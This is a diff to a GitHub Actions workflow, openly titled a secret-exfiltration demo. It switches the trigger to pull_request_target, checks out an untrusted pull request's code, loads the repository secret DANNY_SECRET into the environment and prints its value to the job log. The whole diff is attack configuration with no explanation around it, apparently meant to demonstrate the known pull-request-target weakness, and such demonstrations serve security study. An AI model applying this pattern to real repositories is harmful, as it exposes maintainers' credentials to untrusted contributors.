@@ -1,3 +1,5 @@
+name: Malicious PR Workflow - Secret Exfiltration Demo
+
 on:
   pull_request_target:
     types: [opened, synchronize, reopened]
@@ -6,10 +8,24 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
+      - name: Checkout code from PR (Attackers Code)
         uses: actions/checkout@v4
-      
-      - name: Original benign step
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Exfiltrate DANNY_SECRET
+        env:
+          # This makes the secret available as an environment variable to the script
+          LEAKED_DANNY_SECRET: ${{ secrets.DANNY_SECRET }}
         run: |
-          echo "This is a benign step in the original workflow."
-          echo "no secrets accessed yet."
+          echo "Malicious workflow step running in pull_request_target context!"
+          echo "Attempting to access and exfiltrate DANNY_SECRET..."
+
+          if [ -n "$LEAKED_DANNY_SECRET" ]; then
+            echo "SUCCESS! DANNY_SECRET has been accessed."
+            echo "Value of DANNY_SECRET: $LEAKED_DANNY_SECRET"
+          else
+            echo "FAILURE! DANNY_SECRET is not accessible."
+          fi
+          
+          echo "Malicious step finished."
